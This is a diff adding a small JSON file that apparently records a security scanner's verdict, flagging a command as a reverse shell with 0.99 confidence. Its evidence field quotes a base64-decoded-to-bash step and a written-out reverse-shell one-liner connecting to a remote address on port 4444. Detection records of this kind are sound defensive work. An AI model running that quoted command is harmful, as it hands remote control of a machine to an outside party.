@@ -1,0 +1,6 @@
+{
+  "threat": true,
+  "category": "reverse shell",
+  "confidence": 0.99,
+  "evidence": "base64|bash then bash -i >& /dev/tcp/192.0.2.66/4444 vs benign diagnostic intent"
+}
